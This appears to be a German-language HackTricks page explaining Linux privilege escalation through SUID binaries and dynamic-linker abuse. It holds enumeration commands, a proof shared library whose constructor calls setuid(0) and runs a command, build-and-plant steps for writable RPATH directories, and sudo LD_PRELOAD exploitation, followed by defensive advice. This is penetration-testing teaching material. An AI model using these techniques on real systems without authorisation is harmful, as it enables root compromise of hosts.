# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID-Binaries werden normalerweise auf direkte command execution geprüft, aber benutzerdefinierte SUID-Programme können auch über den dynamic linker angreifbar sein. Das gemeinsame Muster ist einfach: Eine privilegierte ausführbare Datei lädt Code aus einem Pfad oder einer Konfiguration, den bzw. die ein Benutzer mit geringeren Privilegien beeinflussen kann.

Diese Seite konzentriert sich auf allgemeine Technikmuster: fehlende Libraries, beschreibbare Library-Verzeichnisse, `RPATH`/`RUNPATH`, `LD_PRELOAD` über sudo, die Linker-Konfiguration und SUID-hardlink confusion.

## Fast Enumeration

Beginne damit, ungewöhnliche SUID-Dateien zu finden und zu prüfen, ob sie dynamisch gelinkt sind:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Konzentriere dich auf nicht standardmäßige Speicherorte, benutzerdefinierte Anwendungspfade, root gehörende Binaries außerhalb paketverwalteter Verzeichnisse und aus beschreibbaren Verzeichnissen geladene Dependencies.

Nützliche Prüfungen der Schreibbarkeit:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Einige benutzerdefinierte SUID-Binaries versuchen, ein Shared Object zu laden, das nicht existiert. Befindet sich der fehlende Pfad unter einem vom Angreifer kontrollierten Verzeichnis, lädt das Binary möglicherweise vom Angreifer bereitgestellten Code mit den Rechten des effektiven Benutzers.

Fehlgeschlagene Library-Lookups finden:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Wenn die Binary einen beschreibbaren Pfad nach `libexample.so` durchsucht, kann eine minimale Proof-Library einen Constructor verwenden. Halte den Nachweis der Auswirkungen während der Validierung harmlos:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Erstelle sie mit dem exakten Dateinamen, den die Binärdatei zu laden versucht:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Die ausnutzbare Bedingung ist nicht allein die fehlende Bibliothek. Der Angreifer muss ein kompatibles Shared Object an einem Pfad platzieren können, den der privilegierte Loader akzeptiert.

## Beschreibbares Bibliotheksverzeichnis

Manchmal sind alle Abhängigkeiten vorhanden, aber eines der für ihre Auflösung verwendeten Verzeichnisse ist beschreibbar. Dadurch kann eine geladene Bibliothek ersetzt oder eine Bibliothek mit höherer Priorität und demselben Namen platziert werden.

Überprüfe die Abhängigkeitspfade:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Wenn das Verzeichnis beschreibbar ist, validiere dies in einer Laborumgebung mit einem kopiersicheren Ansatz. Das Ersetzen von Systembibliotheken auf einem aktiven Host kann die Authentifizierung, die Paketverwaltung oder für den Bootvorgang kritische Dienste beeinträchtigen.

## RPATH und RUNPATH

`RPATH` und `RUNPATH` sind Einträge im dynamischen Abschnitt, die dem Loader mitteilen, wo nach Bibliotheken gesucht werden soll. Sie sind in SUID-Programmen gefährlich, wenn sie auf für Angreifer beschreibbare Verzeichnisse verweisen.

Erkennen:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Beispiel für eine riskante Ausgabe:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Wenn `/opt/app/lib` beschreibbar ist und die Binary `libcustom.so` benötigt, kann der Angreifer möglicherweise eine schädliche `libcustom.so` dort ablegen:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` und `RUNPATH` sind nicht in allen Details der Auflösung identisch, aber bei der Prüfung auf Privilege Escalation ist die praktische Frage dieselbe: Durchsucht das SUID-Binary ein für den Angreifer beschreibbares Verzeichnis nach einem Library-Namen?

## LD_PRELOAD, LD_LIBRARY_PATH und SUID

Bei normalen Programmen können `LD_PRELOAD` und `LD_LIBRARY_PATH` das Laden von Shared Objects erzwingen oder beeinflussen. Bei SUID-Programmen wechselt der Dynamic Loader normalerweise in den secure-execution mode und ignoriert gefährliche Umgebungsvariablen.

Das bedeutet, dass ein einfaches SUID-Binary normalerweise nicht allein deshalb verwundbar ist, weil der Benutzer `LD_PRELOAD` setzen kann:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Die häufigste Ausnahme ist eine Fehlkonfiguration von sudo. Wenn `sudo -l` zeigt, dass eine Variable wie `LD_PRELOAD` oder `LD_LIBRARY_PATH` beibehalten wird, kann ein über sudo erlaubter Befehl von Angreifern kontrollierten Code laden:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Diese Fälle dürfen nicht verwechselt werden:

- `LD_PRELOAD` gegenüber einer normalen SUID-Binary: wird durch secure execution normalerweise blockiert.
- Durch sudo erhaltenes `LD_PRELOAD`: potenziell ausnutzbar.
- Fehlende `.so` in einem beschreibbaren Pfad: ausnutzbar, wenn die SUID-Binary diesen Pfad normalerweise lädt.
- `RPATH`/`RUNPATH` zu einem beschreibbaren Verzeichnis: ausnutzbar, wenn eine benötigte Library kontrolliert werden kann.
- Schreibzugriff auf `/etc/ld.so.preload` oder die Linker-Konfiguration: systemweit und mit hohen Auswirkungen.

## Linker-Konfiguration

Der dynamic linker liest außerdem die Systemkonfiguration, etwa `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, den Linker-Cache und in manchen Fällen `/etc/ld.so.preload`.

Prüfungen mit hoher Priorität:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Eine beschreibbare Linker-Konfiguration ist normalerweise schwerwiegender als eine einzelne verwundbare SUID-Binary, da sie viele dynamisch gelinkte Prozesse beeinflussen kann. `/etc/ld.so.preload` ist besonders gefährlich, weil dadurch ein Shared Object in privilegierte Prozesse geladen werden kann.

## SUID-Hardlink-Verwechslung

Hardlinks können dafür sorgen, dass derselbe SUID-Inode unter mehreren Namen erscheint. Dies ist nützlich, um einen privilegierten Helfer zu verbergen, die Bereinigung zu erschweren oder eine naive pfadbasierte Überprüfung zu umgehen.

Finde SUID-Dateien mit mehr als einem Link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Überprüfe alle Pfade zur selben Inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Der Missbrauch besteht nicht darin, dass ein Hardlink Berechtigungen ändert. Der Missbrauch ist die Pfadverwechslung: Ein privilegierter Inode kann über einen Namen erreichbar sein, den Verteidiger oder Scripts nicht erwarten. Einen tieferen Einblick in Inodes und den Hardlink-Workflow findest du unter [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Hinweise

- Halte SUID-Binaries minimal, auditiert und nach Möglichkeit paketverwaltet.
- Vermeide `RPATH`-/`RUNPATH`-Einträge, die auf beschreibbare oder von Anwendungen verwaltete Verzeichnisse verweisen.
- Halte Bibliotheksverzeichnisse im Besitz von root und für normale Benutzer nicht beschreibbar.
- Bewahre `LD_PRELOAD`, `LD_LIBRARY_PATH` oder ähnliche Loader-Variablen nicht über sudo hinweg.
- Überwache `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` und unerwartete SUID-Dateien.
- Überprüfe hart verlinkte SUID-Dateien und untersuche benutzerdefinierte SUID-Wrapper außerhalb standardmäßiger Systempfade.
